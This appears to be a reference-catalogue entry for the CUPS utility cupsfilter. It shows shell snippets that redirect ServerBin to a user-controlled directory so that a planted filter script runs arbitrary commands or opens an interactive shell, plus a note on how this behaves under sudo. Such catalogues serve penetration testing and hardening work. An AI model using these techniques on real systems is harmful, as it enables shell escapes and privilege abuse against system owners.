shell.description: The `-c` flag allows specifying a custom `cups-files.conf` to redirect `ServerBin` to a user-controlled directory. By placing a filter script (like `gziptoany`) in that directory, arbitrary commands can be executed.
shell.code:
COMMAND='id'
WORKDIR=$(mktemp -d)
mkdir -p "$WORKDIR/cups/filter"
printf '#!/bin/sh\n%s\n' "$COMMAND" > "$WORKDIR/cups/filter/gziptoany"
chmod +x "$WORKDIR/cups/filter/gziptoany"
printf 'ServerBin %s/cups\nDataDir /usr/share/cups' "$WORKDIR" > "$WORKDIR/cups-files.conf"
cupsfilter -c "$WORKDIR/cups-files.conf" -i text/plain -m text/plain /dev/null 2>/dev/null

shell.description: Spawning an interactive system shell using the `ServerBin` redirection technique.
shell.code:
WORKDIR=$(mktemp -d)
mkdir -p "$WORKDIR/cups/filter"
printf '#!/bin/sh\nexec /bin/sh' > "$WORKDIR/cups/filter/gziptoany"
chmod +x "$WORKDIR/cups/filter/gziptoany"
printf 'ServerBin %s/cups\nDataDir /usr/share/cups' "$WORKDIR" > "$WORKDIR/cups-files.conf"
cupsfilter -c "$WORKDIR/cups-files.conf" -i text/plain -m text/plain /dev/null 2>/dev/null

sudo.description: The file read primitive works directly via sudo. For command execution, `cupsfilter` calls `_cupsFileCheck` when running as root, requiring the custom config file to be owned by root.
